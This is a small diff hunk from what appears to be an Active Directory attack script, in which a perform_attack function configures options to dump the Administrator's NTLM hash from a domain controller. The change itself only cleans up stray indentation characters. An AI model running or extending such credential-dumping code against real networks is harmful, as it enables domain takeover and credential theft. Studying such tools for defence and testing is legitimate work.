@@ -99,8 +99,8 @@ def perform_attack(dc_handle, dc_ip, target_computer, target_da="Administrator")
             self.just_dc_ntlm = True
             self.just_dc_user = target_da
             self.pwd_last_set = self.user_status = self.resumefile = \
-            ┊   ┊   self.k = self.history = self.ntds = self.sam = self.security = \
-        ┊   ┊   ┊   self.system = self.aesKey = self.bootkey = None
+            self.k = self.history = self.ntds = self.sam = self.security = \
+            self.system = self.aesKey = self.bootkey = None
             self.dc_ip = dc_ip
     class PSOptions:
         def __init__(self):
